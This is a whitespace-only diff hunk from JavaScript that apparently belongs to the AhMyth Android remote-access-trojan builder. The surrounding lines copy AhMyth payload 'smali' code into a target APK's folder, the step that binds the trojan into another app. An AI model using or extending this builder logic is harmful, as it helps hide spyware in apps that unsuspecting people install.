@@ -124,7 +124,7 @@ fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
                 fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => { 
                     if (error) {
                         console.log('Copying Failed!');
-                		console.log();
+                        console.log();
                 		return; 
                     };
                     
